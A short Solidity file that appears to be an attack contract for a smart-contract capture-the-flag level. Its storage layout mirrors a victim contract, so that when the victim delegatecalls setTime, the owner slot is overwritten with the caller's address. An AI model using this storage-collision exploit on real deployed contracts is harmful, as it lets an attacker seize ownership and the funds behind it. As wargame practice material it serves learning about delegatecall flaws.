// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LibraryContractAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
